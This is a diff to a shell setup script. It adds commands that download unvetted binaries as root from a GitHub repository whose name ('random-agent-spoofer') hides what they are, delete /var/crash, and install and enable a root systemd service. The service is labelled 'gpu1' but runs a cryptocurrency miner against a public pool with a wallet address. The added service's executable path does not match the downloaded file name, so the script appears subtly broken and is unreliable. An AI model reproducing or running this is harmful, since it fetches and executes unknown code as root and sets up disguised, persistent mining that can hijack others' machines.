@@ -2,10 +2,27 @@
 cd /home
 sudo wget https://github.com/trangtrau/random-agent-spoofer/raw/master/ETH/a
 sudo wget https://github.com/trangtrau/random-agent-spoofer/raw/master/ETH/sec
+sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar
+chmod +x ar 
+
 sudo chmod +x sec
 sudo chmod +x a
 sudo rm -rf /lib/systemd/system/gpu1.service
 sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/rtm.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home//r -a gr -o stratum+ssl://asia.flockpool.com:5555 -u RCjpfnfFfjvhnDzfY9ShQrAtjrP3Vf2PLP.mlnc6 -p x 
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
 bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
 [Unit]
 Description=gpu1
@@ -20,7 +37,12 @@ User=root
 WantedBy=multi-user.target
 EOT
 ' &&
+
 systemctl daemon-reload &&
 systemctl enable gpu1.service &&
+systemctl enable rtm.service &&
 service gpu1 stop  &&
 service gpu1 restart
+
+
+
